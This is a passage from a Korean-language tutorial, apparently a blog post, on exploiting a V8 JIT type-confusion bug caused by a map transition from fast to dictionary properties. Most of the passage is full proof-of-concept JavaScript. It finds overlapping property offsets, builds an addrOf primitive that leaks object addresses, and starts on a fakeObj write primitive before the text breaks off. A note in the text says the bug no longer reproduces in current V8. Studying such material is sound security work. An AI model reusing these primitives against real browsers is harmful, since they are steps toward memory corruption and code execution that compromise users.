&#xBCF4;&#xC774;&#xAC8C; &#xB418;&#xB294; &#xD604;&#xC0C1;</strong>&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xC81C; &#xC774; &#xD604;&#xC0C1;&#xC744; trigger &#xD568;&#xC73C;&#xB85C;&#xC368; exploit&#xC744; &#xD560; &#xC218; &#xC788;&#xB294; primitive&#xB97C; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC704;&#xC5D0;&#xC11C; &#xBCF4;&#xC2E0; &#xAC83;&#xCC98;&#xB7FC; &#xBC18;&#xBCF5;&#xBB38;&#xC744; &#xD1B5;&#xD55C; hot code&#xB85C; JIT &#xCEF4;&#xD30C;&#xC77C;&#xB7EC;&#xAC00; &#xAC1D;&#xCCB4;&#xC758; map&#xC744; &#xAC00;&#xC815;&#xD558;&#xB3C4;&#xB85D; &#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB7EC;&#xBA74; &#xACE0;&#xC815;&#xB41C; &#xC624;&#xD504;&#xC14B;&#xC73C;&#xB85C; property&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xB294; native &#xCF54;&#xB4DC;&#xAC00; &#xC0DD;&#xC131;&#xB429;&#xB2C8;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xBA74;, <code>obj.p10</code>&#xC740; <code>base + offset + 10*8</code>&#xC5D0;&#xC11C; &#xC77D;&#xB3C4;&#xB85D; &#xCEF4;&#xD30C;&#xC77C;&#xB41C;&#xB2E4;. &#xC774;&#xB807;&#xAC8C; &#xC624;&#xD504;&#xC14B;&#xC774; &#xACE0;&#xC815;&#xB41C; &#xCC44;&#xB85C; &#xCEF4;&#xD30C;&#xC77C;&#xB418;&#xC5C8;&#xB2E4;&#xBA74;, &#xB7F0;&#xD0C0;&#xC784;&#xC5D0; Map transition&#xC744; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB7EC;&#xBA74; &#xAC1D;&#xCCB4;&#xC758; map&#xC774; <code>FastProperties</code> &#x2192; <code>DictionaryProperties</code>&#xB85C; &#xC804;&#xD658;&#xB418;&#xC5B4;&#xC694;. &#xC989; backing store&#xAC00; <code>FixedArray</code>&#xC5D0;&#xC11C; <code>NameDictionary</code>&#xB85C; &#xAD50;&#xCCB4;&#xB429;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC;, <strong>JIT &#xCF54;&#xB4DC;&#xB294; &#xBC14;&#xB010; &#xAD6C;&#xC870;&#xB97C; &#xBAA8;&#xB974;&#xACE0; &#xACC4;&#xC18D; &#xACE0;&#xC815;&#xB41C; &#xC624;&#xD504;&#xC14B;&#xC73C;&#xB85C; &#xC811;&#xADFC;&#xD569;&#xB2C8;&#xB2E4;.</strong> JIT &#xCF54;&#xB4DC;&#xAC00; &#xC5EC;&#xC804;&#xD788; <code>FixedArray</code>&#xC758; &#xC624;&#xD504;&#xC14B;&#xC73C;&#xB85C; &#xC77D;&#xB294;&#xB370;, &#xC2E4;&#xC81C; &#xBA54;&#xBAA8;&#xB9AC;&#xB294; &#xC774;&#xC81C; <code>NameDictionary</code> &#xB808;&#xC774;&#xC544;&#xC6C3;&#xC784;&#xC73C;&#xB85C;, &#xB450; &#xB808;&#xC774;&#xC544;&#xC6C3;&#xC758; &#xD544;&#xB4DC; &#xBC30;&#xCE58;&#xAC00; &#xB2E4;&#xB974;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; <strong>&#xAC19;&#xC740; &#xC811;&#xADFC;&#xC774; &#xB2E4;&#xB978; &#xD544;&#xB4DC;&#xB97C; &#xC77D;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</strong></p><h3 id="Finding-Overlapping-Properties"><a href="#Finding-Overlapping-Properties" class="headerlink" title="Finding Overlapping Properties"></a>Finding Overlapping Properties</h3><pre><code class="hljs c"><span class="hljs-comment">// Create object with one inline and 31 out-of-line properties</span><span class="hljs-function">function <span class="hljs-title">makeObj</span><span class="hljs-params">()</span> </span>{    let obj = {<span class="hljs-keyword">inline</span>: <span class="hljs-number">1234</span>};    <span class="hljs-keyword">for</span> (let i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">32</span>; i++) {        Object.defineProperty(obj, <span class="hljs-string">&apos;p&apos;</span> + i, {            writable: <span class="hljs-literal">true</span>,            value: -i        });    }    <span class="hljs-keyword">return</span> obj;}</code></pre><p>&#xC6B0;&#xC120; &#xAC1D;&#xCCB4;&#xB294; &#xC778;&#xB77C;&#xC778; &#xD504;&#xB85C;&#xD37C;&#xD2F0; &#xD558;&#xB098;(<code>inline</code>)&#xC640; &#xC544;&#xC6C3;&#xC624;&#xBE0C;&#xB77C;&#xC778; &#xD504;&#xB85C;&#xD37C;&#xD2F0; 31&#xAC1C;(<code>p1</code> ~ <code>p31</code>)&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. &#xAC01; &#xC544;&#xC6C3;&#xC624;&#xBE0C;&#xB77C;&#xC778; &#xD504;&#xB85C;&#xD37C;&#xD2F0;&#xC5D4; &#xB515;&#xC154;&#xB108;&#xB9AC; &#xB0B4;&#xBD80;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xAE38;&#xC774; &#xAC19;&#xC740; &#xC791;&#xC740; &#xC591;&#xC218; &#xAC12;&#xACFC; &#xD63C;&#xB3D9;&#xB418;&#xC9C0; &#xC54A;&#xB3C4;&#xB85D; &#xC74C;&#xC218; &#xAC12;&#xC744; &#xC2EC;&#xC5B4;&#xB450;&#xC5B4;, &#xB098;&#xC911;&#xC5D0; &#xB364;&#xD504; &#xACB0;&#xACFC;&#xC5D0;&#xC11C; &#xC6B0;&#xB9AC;&#xAC00; &#xC2EC;&#xC740; &#xAC12;&#xB9CC; &#xD655;&#xC2E4;&#xD788; &#xC2DD;&#xBCC4;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xD569;&#xB2C8;&#xB2E4;. &#xC5EC;&#xAE30;&#xC11C; <code>obj.inline</code> &#xAC19;&#xC740; &#xD558;&#xB098;&#xC758; &#xC778;&#xB77C;&#xC778; &#xC811;&#xADFC;&#xC744; &#xB123;&#xC740; &#xAE4C;&#xB2ED;&#xC740; JIT&#xAC00; <code>CheckMap</code>&#xC744; &#xAC70;&#xCCD0; &#x201C;&#xC774; &#xAC1D;&#xCCB4;&#xB294; &#xC774; map&#xC744; &#xAC00;&#xC9C4;&#xB2E4;&#x201D;&#xB77C;&#xB294; &#xAC00;&#xC815;&#xC744; &#xB9CC;&#xB4E4;&#xAC70;&#xB098; &#xD655;&#xC778;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xC989; &#xC774; <code>obj.inline</code> &#xC811;&#xADFC;&#xC774; <strong>vuln()&#xC5D0;&#xC11C; &#xB9F5; &#xCCB4;&#xD06C;</strong>&#xB97C; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0A4;&#xB294; &#xC5ED;&#xD560;&#xC744; &#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; map transition&#xC744; &#xC77C;&#xC73C;&#xD0A4;&#xBA74; JIT&#xAC00; &#xC774;&#xC804; &#xAC00;&#xC815;&#xC744; &#xACC4;&#xC18D; &#xC0AC;&#xC6A9;&#xD574;&#xC11C; Type Confusion&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xACB9;&#xCE58;&#xB294; &#xC18D;&#xC131; &#xC30D;&#xC744; &#xCC3E;&#xB294; &#xC804;&#xCCB4; poc &#xCF54;&#xB4DC;&#xB97C; &#xC0B4;&#xD3B4;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-comment">// Create object with one inline and 31 out-of-line properties</span><span class="hljs-function">function <span class="hljs-title">makeObj</span><span class="hljs-params">()</span> </span>{    let obj = {<span class="hljs-keyword">inline</span>: <span class="hljs-number">1234</span>};    <span class="hljs-keyword">for</span> (let i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">32</span>; i++) {        Object.defineProperty(obj, <span class="hljs-string">&apos;p&apos;</span> + i, {            writable: <span class="hljs-literal">true</span>,            value: -i        });    }    <span class="hljs-keyword">return</span> obj;}<span class="hljs-comment">// Find a pair of properties where p1 is stored at the same offset</span><span class="hljs-comment">// in the FixedArray as p2 is in the NameDictionary</span><span class="hljs-function">function <span class="hljs-title">findOverlappingProperties</span><span class="hljs-params">()</span> </span>{    <span class="hljs-comment">// Create an array of all 32 property names such as p1..p32</span>    let pNames = [];    <span class="hljs-keyword">for</span> (let i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) {        pNames[i] = <span class="hljs-string">&apos;p&apos;</span> + i;    }    <span class="hljs-comment">// Create eval of our vuln function that will generate code during runtime</span>    eval(`    function vuln(obj) {      <span class="hljs-comment">// Access Property inline of obj, forcing a CheckMap operation</span>      obj.<span class="hljs-keyword">inline</span>;      <span class="hljs-comment">// Force a Map Transition via our side-effect</span>      <span class="hljs-keyword">this</span>.Object.create(obj);      <span class="hljs-comment">// Trigger our type-confusion by accessing out-of-bound properties</span>      ${pNames.<span class="hljs-built_in">map</span>((p) =&gt; `let ${p} = obj.${p};`).join(<span class="hljs-string">&apos;\n&apos;</span>)}      return [${pNames.join(&apos;, &apos;)}];    }  `)    <span class="hljs-comment">// JIT code to trigger vuln</span>    <span class="hljs-keyword">for</span> (let i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {        let res = vuln(makeObj());        <span class="hljs-comment">// Print FixedArray when i=1 and Dictionary when i=9999</span>        <span class="hljs-keyword">if</span> (i == <span class="hljs-number">1</span> || i == <span class="hljs-number">9999</span>) {            print(res);        }    }}print(<span class="hljs-string">&quot;[+] Finding Overlapping Properties&quot;</span>);findOverlappingProperties();</code></pre><p>&#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD2B8;&#xB9AC;&#xAC70;&#xD558;&#xB294; <code>vuln()</code> &#xD568;&#xC218;&#xB294; <code>eval</code>&#xACFC; &#xD15C;&#xD50C;&#xB9BF; &#xB9AC;&#xD130;&#xB7F4;&#xC744; &#xC774;&#xC6A9;&#xD574; &#xB7F0;&#xD0C0;&#xC784;&#xC5D0; <code>p1</code>~<code>p31</code>&#xC744; &#xC77D;&#xACE0; &#xBC30;&#xC5F4;&#xB85C; &#xBC18;&#xD658;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xB97C; &#xB3D9;&#xC801;&#xC73C;&#xB85C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB807;&#xAC8C; &#xD558;&#xBA74; &#xC0AC;&#xB78C;&#xC774; &#xC77C;&#xC77C;&#xC774; &#xCF54;&#xB4DC;&#xB97C; &#xC801;&#xC9C0; &#xC54A;&#xC544;&#xB3C4; &#xB9CE;&#xC740; &#xC18D;&#xC131;&#xC744; &#xD55C;&#xAEBC;&#xBC88;&#xC5D0; &#xC77D;&#xC5B4;&#xB4E4;&#xC774;&#xB294; JIT &#xCF54;&#xB4DC;&#xB97C; &#xB9CC;&#xB4E4; &#xC218; &#xC788;&#xACE0;, &#xBC18;&#xBCF5; &#xC2E4;&#xD589;&#xC744; &#xD1B5;&#xD574; JIT &#xD504;&#xB85C;&#xD30C;&#xC77C;&#xB9C1;&#xC774; &#xC77C;&#xC5B4;&#xB098; &#xCD5C;&#xC801;&#xD654;&#xB41C;(&#xACE0;&#xC815; &#xC624;&#xD504;&#xC14B;&#xC744; &#xC4F0;&#xB294;) &#xCF54;&#xB4DC;&#xB97C; &#xC720;&#xB3C4;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD0D0;&#xC0C9; &#xC804;&#xB7B5;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBA3C;&#xC800; &#xB9CE;&#xC740; &#xD6C4;&#xBCF4; property&#xB97C;&#xC744; &#xC2EC;&#xC5B4; &#xBC84;&#xADF8;(Type Confusion) &#xD2B8;&#xB9AC;&#xAC70; &#xC804;&#xD6C4;&#xC758; &#xC77D;&#xAE30; &#xACB0;&#xACFC;&#xB97C; &#xBE44;&#xAD50;&#xD574; &#xCC28;&#xC774;&#xAC00; &#xB098;&#xB294; &#xC778;&#xB371;&#xC2A4;&#xB97C; &#xCC3E;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p><img src="image%207.png" alt="image.png"></p><blockquote><p>&#xCC38;&#xACE0;&#xB85C; ../v8&#xC740; &#xCD5C;&#xC2E0;&#xBC84;&#xC804;&#xC73C;&#xB85C; &#xD574;&#xB2F9; &#xBC84;&#xADF8;&#xAC00; &#xC7AC;&#xD604;&#xB418;&#xC9C0; &#xC54A;&#xC74C;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p></blockquote><p>&#xB3D9;&#xC77C;&#xD55C; &#xAC1D;&#xCCB4; &#xD615;&#xD0DC;&#xB97C; &#xC218;&#xCC9C; &#xBC88; &#xBC18;&#xBCF5; &#xC2E4;&#xD589;&#xD574; JIT &#xCEF4;&#xD30C;&#xC77C;&#xC744; &#xC720;&#xB3C4;&#xD55C; &#xB4A4;, &#xC758;&#xB3C4;&#xC801;&#xC73C;&#xB85C; map &#xC804;&#xD658;&#xC744; &#xBC1C;&#xC0DD;&#xC2DC;&#xCF1C; FixedArray &#xC0C1;&#xD0DC;&#xC640; NameDictionary &#xC0C1;&#xD0DC;&#xC758; &#xC77D;&#xAE30; &#xACB0;&#xACFC;&#xB97C; &#xBE44;&#xAD50;&#xD558;&#xBA74; &#x201C;&#xC74C;&#xC218; &#xAC12;&#xC774; &#xC774;&#xB3D9;&#xD55C; &#xC704;&#xCE58;&#x201D;&#xAC00; &#xD6C4;&#xBCF4;&#xAC00; &#xB429;&#xB2C8;&#xB2E4;. &#xC774; &#xD6C4;&#xBCF4;&#xB4E4; &#xC911;&#xC5D0;&#xC11C; pX&#xAC00; &#xC790;&#xAE30; &#xC790;&#xC2E0;&#xACFC; &#xACB9;&#xCE58;&#xB294; &#xBB34;&#xC758;&#xBBF8;&#xD55C; &#xCF00;&#xC774;&#xC2A4;&#xB294; &#xC81C;&#xAC70;&#xD558;&#xACE0;, &#xC11C;&#xB85C; &#xB2E4;&#xB978; &#xC18D;&#xC131; &#xC30D;(pA &#x2194; pB)&#xB9CC; &#xACE8;&#xB77C; &#xB3D9;&#xC77C;&#xD55C;&#xC9C0; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;. &#xC544;&#xB798; &#xCF54;&#xB4DC;&#xB294; &#xACB9;&#xCE58;&#xB294; &#xC18D;&#xC131; &#xC30D;&#xC744; &#xCC3E;&#xB294; &#xC804;&#xCCB4; poc &#xCF54;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-comment">// Function that creates an object with one in-line and 32 out-of-line properties</span><span class="hljs-function">function <span class="hljs-title">makeObj</span><span class="hljs-params">()</span> </span>{    let obj = {<span class="hljs-keyword">inline</span>: <span class="hljs-number">1234</span>};    <span class="hljs-keyword">for</span> (let i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">32</span>; i++) {        Object.defineProperty(obj, <span class="hljs-string">&apos;p&apos;</span> + i, {            writable: <span class="hljs-literal">true</span>,            value: -i        });    }    <span class="hljs-keyword">return</span> obj;}<span class="hljs-comment">// Function that finds a pair of properties where p1 is stored at the same offset</span><span class="hljs-comment">// in the FixedArray as p2 in the NameDictionary</span>let p1, p2;<span class="hljs-function">function <span class="hljs-title">findOverlappingProperties</span><span class="hljs-params">()</span> </span>{    <span class="hljs-comment">// Create an array of all 32 property names such as p1..p32</span>    let pNames = [];    <span class="hljs-keyword">for</span> (let i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) {        pNames[i] = <span class="hljs-string">&apos;p&apos;</span> + i;    }    <span class="hljs-comment">// Create eval of our vuln function that will generate code during runtime</span>    eval(`    function vuln(obj) {      <span class="hljs-comment">// Access Property inline of obj, forcing a CheckMap operation</span>      obj.<span class="hljs-keyword">inline</span>;      <span class="hljs-comment">// Force a Map Transition via our side-effect</span>      <span class="hljs-keyword">this</span>.Object.create(obj);      <span class="hljs-comment">// Trigger our type-confusion by accessing out-of-bound properties</span>      ${pNames.<span class="hljs-built_in">map</span>((p) =&gt; `let ${p} = obj.${p};`).join(<span class="hljs-string">&apos;\n&apos;</span>)}      return [${pNames.join(&apos;, &apos;)}];    }  `)    <span class="hljs-comment">// JIT code to trigger vuln</span>    <span class="hljs-keyword">for</span> (let i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {        <span class="hljs-comment">// Create Object and pass it to Vuln function</span>        let res = vuln(makeObj());        <span class="hljs-comment">// Look for overlapping properties in results</span>        <span class="hljs-keyword">for</span> (let i = <span class="hljs-number">1</span>; i &lt; res.length; i++) {            <span class="hljs-comment">// If i is not the same value, and res[i] is between -32 and 0, it overlaps</span>            <span class="hljs-keyword">if</span> (i !== -res[i] &amp;&amp; res[i] &lt; <span class="hljs-number">0</span> &amp;&amp; res[i] &gt; <span class="hljs-number">-32</span>) {                [p1, p2] = [i, -res[i]];                <span class="hljs-keyword">return</span>;            }        }    }    <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;[!] Failed to find overlapping properties&quot;</span>;}print(<span class="hljs-string">&quot;[+] Finding Overlapping Properties...&quot;</span>);findOverlappingProperties();print(`[+] Properties p${p1} <span class="hljs-keyword">and</span> p${p2} overlap!`);</code></pre><p><img src="image%208.png" alt="image.png"></p><p>&#xC704;&#xC5D0;&#xC11C; &#xB9D0;&#xC500;&#xB4DC;&#xB838;&#xB2E4;&#xC2DC;&#xD53C; NameDictionary&#xB294; &#xC18D;&#xC131;&#xC758; &#xC800;&#xC7A5; &#xC704;&#xCE58;&#xAC00; &#xC2E4;&#xD589;&#xB9C8;&#xB2E4; &#xBB34;&#xC791;&#xC704;&#xB85C; &#xBCC0;&#xB3D9;&#xB418;&#xC5B4; &#xB7F0;&#xD0C0;&#xC784;&#xC5D0; &#xC774;&#xB807;&#xAC8C; &#xB3D9;&#xC801;&#xC73C;&#xB85C; &#xC30D;&#xC744; &#xCC3E;&#xC544;&#xC918;&#xC57C;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xC81C; &#xC774; &#xC30D;&#xC744; &#xC774;&#xC6A9;&#xD574;&#xC11C; &#xC5B4;&#xB5BB;&#xAC8C; Read/Write primitive&#xB97C; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xB294;&#xC9C0; &#xC54C;&#xC544;&#xBD05;&#xC2DC;&#xB2E4;!</p><h3 id="The-addrOf-Read-Primitive"><a href="#The-addrOf-Read-Primitive" class="headerlink" title="The addrOf Read Primitive"></a>The addrOf Read Primitive</h3><p>double &#xD615;&#xD0DC;&#xB85C; &#xC800;&#xC7A5;&#xB418;&#xB294; inline &#xAC1D;&#xCCB4;&#xB97C; &#xD558;&#xB098; &#xB9CC;&#xB4E0; &#xD6C4; &#xADF8; &#xB2E4;&#xC74C; backing store&#xC5D0; &#xC800;&#xC7A5;&#xB418;&#xB294; &#xAC1D;&#xCCB4;&#xB97C; &#xD558;&#xB098; &#xC120;&#xC5B8; &#xD6C4;, Type Confusion&#xC744; &#xC77C;&#xC73C;&#xCF1C;&#xBD05;&#xC2DC;&#xB2E4;. &#xADF8;&#xB7FC; &#xAC1D;&#xCCB4; &#xD3EC;&#xC778;&#xD130;&#xAC00; <code>double</code> &#xD0C0;&#xC785;&#xC73C;&#xB85C; &#xD574;&#xC11D;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addrOf</span>(<span class="hljs-params"></span>) </span>{    <span class="hljs-comment">// 1. vuln &#xD568;&#xC218; &#xB3D9;&#xC801; &#xC0DD;&#xC131; (Map &#xAC80;&#xC0AC; &#xC6B0;&#xD68C;)</span>    <span class="hljs-built_in">eval</span>(<span class="hljs-string">`</span><span class="hljs-string">    function vuln(obj) {</span><span class="hljs-string">      obj.inline;</span><span class="hljs-string">      this.Object.create(obj);</span><span class="hljs-string">      // p1&#xC744; Double&#xB85C; &#xC608;&#xC0C1;&#xD558;&#xC9C0;&#xB9CC;, &#xC2E4;&#xC81C; p2&#xC778; Object &#xD3EC;&#xC778;&#xD130;&#xAC00; &#xB85C;&#xB4DC;&#xB428;</span><span class="hljs-string">      return obj.p<span class="hljs-subst">${p1}</span>.x; </span><span class="hljs-string">    }</span><span class="hljs-string">  `</span>);    <span class="hljs-keyword">let</span> obj = {<span class="hljs-attr">z</span>: <span class="hljs-number">1234</span>}; <span class="hljs-comment">// &#xC8FC;&#xC18C;&#xB97C; &#xC54C;&#xACE0;&#xC790; &#xD558;&#xB294; &#xB300;&#xC0C1; &#xAC1D;&#xCCB4;</span>    <span class="hljs-keyword">let</span> pValues = [];    pValues[p1] = {<span class="hljs-attr">x</span>: <span class="hljs-number">13.37</span>}; <span class="hljs-comment">// Double (&#xC608;&#xC0C1; &#xD0C0;&#xC785;)</span>    pValues[p2] = {<span class="hljs-attr">y</span>: obj}; <span class="hljs-comment">// Object (&#xC2E4;&#xC81C; &#xB85C;&#xB4DC;&#xB418;&#xB294; &#xAC12;)</span>    <span class="hljs-comment">// 2. JIT &#xCD5C;&#xC801;&#xD654; &#xBC0F; &#xD0C0;&#xC785; &#xD63C;&#xB3D9; &#xC720;&#xB3C4;</span>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {        <span class="hljs-keyword">let</span> res = vuln(makeObj(pValues));        <span class="hljs-comment">// &#xBC18;&#xD658; &#xAC12;&#xC774; 13.37&#xC774; &#xC544;&#xB2C8;&#xBA74; (&#xC989;, &#xC8FC;&#xC18C;&#xAC00; &#xC720;&#xCD9C;&#xB418;&#xBA74;) &#xC131;&#xACF5;</span>        <span class="hljs-keyword">if</span> (res != <span class="hljs-number">13.37</span>) {            <span class="hljs-keyword">return</span> res.toBigInt() - <span class="hljs-number">1n</span>; <span class="hljs-comment">// &#xC8FC;&#xC18C; &#xBC18;&#xD658; &#xBC0F; &#xD0DC;&#xADF8; &#xC81C;&#xAC70;</span>        }    }    <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;[!] AddrOf Primitive Failed&quot;</span>}</code></pre><p>&#xC544;&#xB798;&#xB294; &#xC704; &#xD568;&#xC218;&#xAC00; &#xD3EC;&#xD568;&#xB41C; Read Primitive &#xCF54;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;(&#xD3EC;&#xC778;&#xD130; &#xD0DC;&#xADF8;&#xB97C; &#xC81C;&#xAC70;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xB97C; &#xC6D0;&#xD558;&#xC2DC;&#xBA74; &#xC704; &#xD568;&#xC218;&#xC758; &#xCF54;&#xB4DC;&#xB85C; &#xBC14;&#xAFD4;&#xC11C; &#xC0AC;&#xC6A9;&#xD558;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;).</p><pre><code class="hljs c"><span class="hljs-comment">// Function that creates an object with one in-line and 32 out-of-line properties</span><span class="hljs-function">function <span class="hljs-title">makeObj</span><span class="hljs-params">(pValues)</span> </span>{    let obj = {<span class="hljs-keyword">inline</span>: <span class="hljs-number">1234</span>};    <span class="hljs-keyword">for</span> (let i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) {        Object.defineProperty(obj, <span class="hljs-string">&apos;p&apos;</span> + i, {            writable: <span class="hljs-literal">true</span>,            value: pValues[i]        });    }    <span class="hljs-keyword">return</span> obj;}<span class="hljs-comment">// Function that finds a pair of properties where p1 is stored at the same offset</span><span class="hljs-comment">// in the FixedArray as p2 in the NameDictionary</span>let p1, p2;<span class="hljs-function">function <span class="hljs-title">findOverlappingProperties</span><span class="hljs-params">()</span> </span>{    <span class="hljs-comment">// Create an array of all 32 property names such as p1..p32</span>    let pNames = [];    <span class="hljs-keyword">for</span> (let i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) {        pNames[i] = <span class="hljs-string">&apos;p&apos;</span> + i;    }    <span class="hljs-comment">// Create eval of our vuln function that will generate code during runtime</span>    eval(`    function vuln(obj) {      <span class="hljs-comment">// Access Property inline of obj, forcing a CheckMap operation</span>      obj.<span class="hljs-keyword">inline</span>;      <span class="hljs-comment">// Force a Map Transition via our side-effect</span>      <span class="hljs-keyword">this</span>.Object.create(obj);      <span class="hljs-comment">// Trigger our type-confusion by accessing out-of-bound properties</span>      ${pNames.<span class="hljs-built_in">map</span>((p) =&gt; `let ${p} = obj.${p};`).join(<span class="hljs-string">&apos;\n&apos;</span>)}      return [${pNames.join(&apos;, &apos;)}];    }  `)    <span class="hljs-comment">// Create an array of negative values from -1 to -32 to be used</span>    <span class="hljs-comment">// for out makeObj function</span>    let pValues = [];    <span class="hljs-keyword">for</span> (let i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">32</span>; i++) {        pValues[i] = -i;    }    <span class="hljs-comment">// JIT code to trigger vuln</span>    <span class="hljs-keyword">for</span> (let i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {        <span class="hljs-comment">// Create Object and pass it to Vuln function</span>        let res = vuln(makeObj(pValues));        <span class="hljs-comment">// Look for overlapping properties in results</span>        <span class="hljs-keyword">for</span> (let i = <span class="hljs-number">1</span>; i &lt; res.length; i++) {            <span class="hljs-comment">// If i is not the same value, and res[i] is between -32 and 0, it overlaps</span>            <span class="hljs-keyword">if</span> (i !== -res[i] &amp;&amp; res[i] &lt; <span class="hljs-number">0</span> &amp;&amp; res[i] &gt; <span class="hljs-number">-32</span>) {                [p1, p2] = [i, -res[i]];                <span class="hljs-keyword">return</span>;            }        }    }    <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;[!] Failed to find overlapping properties&quot;</span>;}<span class="hljs-function">function <span class="hljs-title">addrOf</span><span class="hljs-params">()</span> </span>{    eval(`    function vuln(obj) {      obj.<span class="hljs-keyword">inline</span>;      <span class="hljs-keyword">this</span>.Object.create(obj);      <span class="hljs-comment">// Trigger our type-confusion by accessing an out-of-bound property</span>        <span class="hljs-comment">// This will load p1 from our object thinking it&apos;s a Double, but instead</span>        <span class="hljs-comment">// due to overlap, it will load p2 which is an Object</span>      <span class="hljs-keyword">return</span> obj.p${p1}.x;    }  `);    let obj = {z: <span class="hljs-number">1234</span>};    let pValues = [];    pValues[p1] = {x: <span class="hljs-number">13.37</span>};    pValues[p2] = {y: obj};    <span class="hljs-keyword">for</span> (let i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {        let res = vuln(makeObj(pValues));        <span class="hljs-keyword">if</span> (res != <span class="hljs-number">13.37</span>) {            %DebugPrint(obj);            <span class="hljs-keyword">return</span> res;        }    }    <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;[!] AddrOf Primitive Failed&quot;</span>}print(<span class="hljs-string">&quot;[+] Finding Overlapping Properties...&quot;</span>);findOverlappingProperties();print(`[+] Properties p${p1} <span class="hljs-keyword">and</span> p${p2} overlap!`);let x = addrOf();print(<span class="hljs-string">&quot;[+] Leaking Object Address...&quot;</span>);print(`[+] Object Address: ${x}`);</code></pre><p>&#xC704; &#xCF54;&#xB4DC;&#xB97C; d8&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xC2DC;&#xCF1C;&#xBCF4;&#xBA74; &#xB2E4;&#xC74C;&#xC758; &#xACB0;&#xACFC;&#xB97C; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="image%209.png" alt="image.png"></p><p><code>Object Address</code> &#xB85C; &#xB098;&#xC624;&#xB294; &#xACB0;&#xACFC;&#xB294; double &#xB85C; &#xC778;&#xC2DD;&#xB418;&#xC5B4;&#xC11C; double &#xD45C;&#xAE30;&#xBC95;&#xC73C;&#xB85C; &#xCD9C;&#xB825;&#xC774; &#xB429;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xC774;&#xB97C; &#xC8FC;&#xC18C;&#xB85C; &#xBCC0;&#xD658;&#xD574;&#xC8FC;&#xB294; &#xACFC;&#xC815;&#xC774; &#xD544;&#xC694;&#xD574;&#xC11C; &#xC704;&#xC640; &#xAC19;&#xC774; &#xBCC0;&#xD658;&#xD574;&#xC8FC;&#xBA74; &#xC8FC;&#xC18C;&#xB97C; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;!</p><h3 id="The-fakeObj-Write-Primitive"><a href="#The-fakeObj-Write-Primitive" class="headerlink" title="The fakeObj Write Primitive"></a>The fakeObj Write Primitive</h3><p>Write primitive&#xB294; &#xB2E4;&#xB978; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xC744; &#xD544;&#xC694;&#xC5C6;&#xC774; Read Primitive&#xB97C; &#xBC18;&#xB300;&#xB85C;&#xB9CC; &#xD558;&#xBA74; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB7F0; &#xC810;&#xC774; Type Confusion &#xCDE8;&#xC57D;&#xC810;&#xC758; 